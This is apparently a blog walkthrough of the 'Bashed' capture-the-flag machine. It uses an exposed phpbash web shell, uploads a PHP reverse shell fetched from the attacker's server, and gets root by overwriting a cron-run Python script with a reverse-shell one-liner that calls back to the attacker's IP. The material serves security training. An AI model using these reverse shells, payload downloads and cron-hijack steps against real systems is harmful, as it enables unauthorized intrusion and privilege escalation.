As always we start with our nmap scan.
```console
nmap -T4 -p- -A 10.10.10.68
```
-T4 specifies the speed at which we run the scan, the -p- option scans all 65535 ports, and the -A enables OS detection, version detection, script scanning, and traceroute.
Just the one port is open. Port 80 (http). And the Apache version is returned - Apache httpd 2.4.18

![nmap-scan-results](/assets/img/bashed/bashed-nmap-1.png)

Let's go check out the website at "http://10.10.10.68". We se an Arrexel development site for a web based terminal.

![arrexel-website](/assets/img/bashed/arrexel-site-2.png)


After a bit of enumeration of the site, there isn't much to be found. So we're going do some directory busting using ```gobuster```.
```console
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php
```

![gobuster-tool](/assets/img/bashed/go-buster-2.png)

So with the results gobuster returns, we go through each directory looking for something interesting. The /dev folder looks promising as that directory hosts the web shell. We might be able to do something with that.

![index-page](/assets/img/bashed/dev-index-3.png)

After selecting phpbash.php we are taken to the web terminal. From here we can navigate to the root folder, then home and into the user folder. From here we ```cat user.txt``` and get ourselves the user flag.

![user-flag](/assets/img/bashed/user-flag-4.png)

We list user privileges ```sudo -l``` and see we can switch into a user called ```scriptmanager``` without a password. we ```cd ../scriptmanager``` and ```sudo su scriptmanager``` to switch user, but we get a message saying no tty present. We need that command to be able to print terminal related info. Example:-
>sudo command is trying to execute a command that requires a password but sudo does not have access to a tty to prompt the user for a passphrase.

So we won't be able to proceed any further in this shell, but we can upload a reverse shell that we'll use to gain access.

![sudo-privileges](/assets/img/bashed/sudo-l-5.png)

In a browser navigate to "https://pentestmonkey.net/tools/web-shells/php-reverse-shell" and open the tar.gz file. Then open the "php-reverse-shell.php" file, and copy the contents.

![pen-test-monkey](/assets/img/bashed/monkey-shell-6.png)

From the terminal ```gedit shell.php``` and paste the copied code into the file. Navigate to lines 49 & 50 and change the IP to your tun0 address. You can leave the port number.

![reverse-shell](/assets/img/bashed/shell-7.png)

In a new terminal window start an http server ```python3 -m http.server 80```.

![http-server](/assets/img/bashed/http-server-8.png)

Next step is to navigate back to the the web shell and into the uploads folder ```cd /var/www/html/uploads```. Then ```wget http://10.10.16.2/shell.php``` (replacing the ip with your tun0 address). ```ls``` to confirm the reverse shell has been uploaded.

![shell-upload](/assets/img/bashed/upload-9.png)

Return to the terminal and start a listener with ```netcat nc -nvlp 1234```. Make sure to use the same port number as is in the reverse shell. Then head back to the browser and trigger the shell by navigating to "http://10.10.10.68/uploads/shell.php".
We see in our terminal that we have ourselves a shell.

![shell-success](/assets/img/bashed/reverse-shell-10.png)

We see we still don't have tty. We want to spawn one. In a browser navigate to "https://netsec.ws/?p=337". We'll go through the list of commands until we find one that works.

![netsec-cheatsheet](/assets/img/bashed/netsec-11.png)

For me the first command worked. Make sure however to change ```"/bin/sh"``` to ```"/bin/bash"``` as we want to get a bash shell  - ```python -c 'import pty; pty.spawn("/bin/bash")'```. You can see from the $ sign we've got tty. We try to swith user with sudo su scriptmanager but it doesn't work and does actually expect a password. A worksround here is ```sudo -u scriptmanager /bin/bash```. We are now scriptmanager.

![switch-user](/assets/img/bashed/su-12.png)

We ```pwd``` and see we're in the root folder. We ```ls -la``` to see what users have access to directories and files. Straight away the scriptmanager scripts folder stands out.

![list-privileges](/assets/img/bashed/ls-la-13.png)

Switch into the scripts folder, and type ```ls -la``` to see permissions. We ```cat test.py``` and see the file is writing to the ```test.txt``` file. From the current time and the timestamp on the ```test.txt``` file it looks as though the .py file is a scheduled task. You can ```ls -la``` again to confirm it's a chron job. We can overwrite the python file with a malicious one and get it to execute.

![replace-test-file](/assets/img/bashed/test-14.png)

Back to a browser head to "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" and copy the python script. In a terminal ```gedit test.py``` and copy the script into the file. Remove python -c and the quotes. Alter the IP to your tun0 IP, and change the port number as we already used 1234, change ```"/bin/sh"``` to ```"/bin/bash"``` and save.

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-HERE>",2345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

![test-file](/assets/img/bashed/test-15.png)

In out terminal we need to start a listener for the reverse shell to talk back to ```nc -nvlp 2345```.

![start-netcat](/assets/img/bashed/nc-16.png)

Then in our shell remove the test.py file as we're replacing it with the one we just created. Then ```wget http://10.10.16.2/test.py``` to upload the malicious file.

![wget-file](/assets/img/bashed/get-17.png)

Now that's uploaded we just have to wait for the chron job to trigger again. Once it does we can look at our terminal and see we have root privileges with ```whoami```. The system has been owned!

![rooted](/assets/img/bashed/root-18.png)

All that's left to do is to navigate to the root directory ```cd ../root```,  and collect our flag ```cat root.txt``` to fully pwn the system!
